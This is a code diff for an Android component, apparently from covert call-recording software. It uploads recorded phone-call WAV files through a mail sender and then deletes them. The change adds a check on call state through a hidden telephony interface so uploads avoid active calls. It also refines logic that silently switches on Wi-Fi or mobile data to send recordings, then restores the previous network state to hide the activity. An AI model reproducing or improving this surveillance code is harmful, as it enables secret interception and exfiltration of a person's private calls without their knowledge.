@@ -27,6 +27,7 @@ import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.mail.MailSender;
+import com.particle.inspector.common.util.phone.PhoneUtils;
 import com.particle.inspector.common.util.FileCtrl;
 
 import android.app.Activity;
@@ -37,6 +38,8 @@ import android.content.Intent;
 import android.content.res.Resources;
 import android.net.Uri;
 import android.os.Environment;
+import android.os.RemoteException;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
 /**
@@ -92,6 +95,7 @@ public class GetInfoTask extends TimerTask
 		
 		// Get initial networks state
 		boolean isAlreadyWifiConnected = NetworkUtil.isWifiConnected(context);
+		boolean isAlready3GConneted = NetworkUtil.is3GDataConnected(context);
 		boolean isAlreadyDataNetworkConnected = NetworkUtil.isNetworkConnected(context);
 		NETWORK_CONNECT_MODE netMode = GlobalPrefActivity.getNetworkConnectMode(context);
 		
@@ -178,42 +182,45 @@ public class GetInfoTask extends TimerTask
 		List<File> wavs = FileCtrl.getAllWavFiles(context);
 		int wavCount = wavs.size();
 		if (wavCount > 0) {
-			boolean isWifiConnected = NetworkUtil.isWifiConnected(context);
-			boolean isConnected = NetworkUtil.isNetworkConnected(context);
-		
-			// If network not connected
 			boolean allowToSend = false;
-			if (!isConnected) {
-				// Retrun if silent mode
-				if (netMode == NETWORK_CONNECT_MODE.SILENT || netMode == NETWORK_CONNECT_MODE.WIFISILENT) {
-					// do nothing
-				}
-				// Or try to connect WIFI if wifi active mode
-				else if (netMode == NETWORK_CONNECT_MODE.WIFIACTIVE) {
-					if (NetworkUtil.tryToConnectWifi(context)) {
-						allowToSend = true;
+			
+			TelephonyManager tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
+			try {
+				allowToSend = ! PhoneUtils.getITelephony(tm).isOffhook();
+			} catch (Exception e) {	}
+			
+			if (allowToSend) {
+				if (!NetworkUtil.isNetworkConnected(context)) {
+					// Do not allow to send if data network is not connected
+					allowToSend = false;
+					
+					// Try to connect WIFI if wifi active mode
+					if (netMode == NETWORK_CONNECT_MODE.WIFIACTIVE) {
+						if (NetworkUtil.tryToConnectWifi(context)) {
+							allowToSend = true;
+						}
+					}
+					// Or try to connect network if active mode
+					else if (netMode == NETWORK_CONNECT_MODE.ACTIVE) {
+						if (NetworkUtil.tryToConnectDataNetwork(context)) {
+							allowToSend = true;
+						}
 					}
 				}
-				// Or try to connect network if active mode
-				else if (netMode == NETWORK_CONNECT_MODE.ACTIVE) {
-					if (NetworkUtil.tryToConnectDataNetwork(context)) {
-						allowToSend = true;
+				// If network connected but it is not WIFI (means it is 3G/GPRS data connected)
+				else if (!NetworkUtil.isWifiConnected(context)) {
+					// Return if WIFI silent mode
+					if (netMode == NETWORK_CONNECT_MODE.WIFISILENT) {
+						allowToSend = false;
+					}
+					// Try to connect WIFI if WIFI active mode
+					else if (netMode == NETWORK_CONNECT_MODE.WIFIACTIVE) {
+						if (!NetworkUtil.tryToConnectWifi(context)) {
+							allowToSend = false;
+						}
 					}
 				}
-			}
-			// If network connected but it is not WIFI (means it is 3G/GPRS data connected)
-			else if (!isWifiConnected) {
-				// Return if WIFI silent mode
-				if (netMode == NETWORK_CONNECT_MODE.WIFISILENT) {
-					// do nothing
-				}
-				// Try to connect WIFI if WIFI active mode
-				else if (netMode == NETWORK_CONNECT_MODE.WIFIACTIVE) {
-					if (NetworkUtil.tryToConnectWifi(context)) {
-						allowToSend = true;
-					}
-				}
-			}
+			} // end of if (allowToSend)
 		
 			if (allowToSend) {
 				String prefix = context.getResources().getString(R.string.phonecall_record);
@@ -248,21 +255,25 @@ public class GetInfoTask extends TimerTask
 					if (result) {
 						FileCtrl.cleanWavFiles(pack);
 					}
-				}
-			}
-		}
+				} // end of for(...)
+			} // end of if (allowToSend)
+		} // if (wavCount > 0)
 		
 		// ===================================================================================
 		// Restore phone settings
 		// ===================================================================================
-		// If data network is connected by active mode, try to disconnect it
+		// Originally WIFI off & 3G off, to be restored
 		if (!isAlreadyDataNetworkConnected) {
 			NetworkUtil.tryToDisconnectDataNetwork(context);
 		}
-		// If WIFI connection is connected by active mode, try to disconnect it 
-		else if (!isAlreadyWifiConnected && NetworkUtil.isWifiConnected(context)) {
+		// Originally WIFI off & 3G on, to be restored 
+		else if (!isAlreadyWifiConnected) { 
 			NetworkUtil.tryToDisconnectWifi(context);
-		}
+		} 
+		// Originally WIFI on & 3G off, to be restored
+		else if (!isAlready3GConneted) {
+			NetworkUtil.tryToDisconnect3GData(context);
+		} 
 		
 	} // end of run()
 	
